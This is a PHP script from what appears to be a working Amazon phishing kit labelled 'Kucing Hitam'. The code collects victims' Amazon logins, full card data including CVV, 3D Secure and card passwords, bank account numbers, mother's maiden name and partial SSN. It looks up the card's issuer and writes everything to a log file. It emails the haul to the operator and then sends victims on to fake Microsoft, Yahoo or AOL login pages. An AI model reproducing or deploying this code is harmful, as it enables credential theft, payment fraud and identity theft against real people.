<?php

session_start();
$randomnumber = rand(1,100);
include('../__CONFIG__.php');
require('../detect.php');

if (isset($_POST['Sex']))
{


// fungsi bin
$ncn     = $_POST['ncn'];
$bin     = str_replace(' ', '', $ncn);
$bin     = substr($bin, 0, 6);
$ncn     = str_replace(' ', '', $ncn);
$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://binlist.io/lookup/".$bin."/");
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($c, CURLOPT_FOLLOWLOCATION,true);
$result = curl_exec($c);
curl_close($c);
$ident = json_decode($result);
$ccbrand = strtoupper($ident->scheme);
$ccbank =  strtoupper($ident->bank->name);
$cctype = strtoupper($ident->type);
$cclevel = strtoupper($ident->category);
$_SESSION["scheme"] = $ccbrand;
$_SESSION["type"] = $cctype;
$_SESSION["category"] = $cclevel;
$_SESSION["bank"] = $ccbank;
//lanjuut

$message=
"
[+] ========. [ $$ Kucing Hitam $$ ] .======= [+]
----------------Akun Amazon----------------------

Username	    : ".$_SESSION['EM']."
Password      :	".$_SESSION['PW']."

-----------Bank Identification Number------------
Bin: ".$bin." - " .$ccbrand." " .$cctype." " .$cclevel." " .$ccbank."
----------------Credit Card----------------------
Cardholder    : ".$_SESSION['nameoncard']."
Card number   : ".$_SESSION['ncn']."
Expire        : ".$_SESSION['month']."/".$_SESSION['year']."
cvv           : ".$_SESSION['cxxs']."
CID (AMEX)    : ".$_SESSION['cid']."
---------------Billing Info----------------------
Full Name     : ".$_SESSION['fullname']."
Address1      : ".$_SESSION['address1']."
Address2      : ".$_SESSION['address2']."
City          : ".$_SESSION['city']."
State         : ".$_SESSION['state']."
Zipcode       : ".$_SESSION['zip']."
Country       : ".$_SESSION['country']."
Phone         : ".$_SESSION['phone']."
Date of Birth : ".$_SESSION['dob']."
--------------------VBV--------------------------
Sort Code	    :  ".@$_POST['sortcode']."
3D Secure	    :  ".@$_POST['password_vbv']."
Card Password :  ".@$_POST['card_password']."
Account Number:	 ".@$_POST['accountnum']."
OS ID         :	 ".@$_POST['osid']."
Credit Limit  :	 ".@$_POST['creditlimit']."
Mother Name	  :  ".@$_POST['mothernam']."
Last 4 Ssn	  :  ".@$_POST['ssn']."
Date OF Birth :  ".@$_POST['dob']."
----------------PC Info--------------------------
IP            : ".$ip." | ".$nama_negara."
Browser       : ".$_SERVER['HTTP_USER_AGENT']."
[+] ========. [ $$ Silent Is Gold $$ ] .===== [+]
";
    $save = fopen("../../log/backup_vbv.txt", "a+");
    fwrite($save, $message);
    fclose($save);
    $file2 = "../../log/vbv.txt";
    $isi  = @file_get_contents($file2);
    $buka = fopen($file2,"w"); 
    fwrite($buka, $isi+1);
    fclose($buka);
	$headers = "From: VBV Nya Cokk<amazonVBV-$randomnumber@kucinghitam.team>";
    $subject = "[ ".$ip." ] - [".$nama_negara."] - [".$contin_name."] ";
	mail($to, $subject, $message, $headers);
}	
function strafter($string, $substring) {
  $pos = strpos($string, $substring);
  if ($pos === false)
   return $string;
  else  
   return(substr($string, $pos+strlen($substring)));
}

function strbefore($string, $substring) {
  $pos = strpos($string, $substring);
  if ($pos === false)
   return $string;
  else  
   return(substr($string, 0, $pos));
} 

    $emelbule2 = $_SESSION['EM'];
    $emelbule1 = strafter($emelbule2,'@');
    $emelbule = strbefore($emelbule1,'.');
   
	if($emelbule == "hotmail" || $emelbule == "outlook" || $emelbule == "msn" || $emelbule == "live"){
		header('Location: ../email/microsoft/emailauth.php?udm_cat_path='.sha1(time()));
	}
	else if($emelbule == "yahoo" || $emelbule == "ymail"){
		header('Location: ../email/yahoo/emailauth.php?udm_cat_path='.sha1(time()));
	}
	else if($emelbule == "aol"){
		header('Location: ../email/aol/emailauth.php?udm_cat_path='.sha1(time()));
	}
	else {
		header('Location: ../Thanks.php?udm_cat_path='.sha1(time()));
	}
	
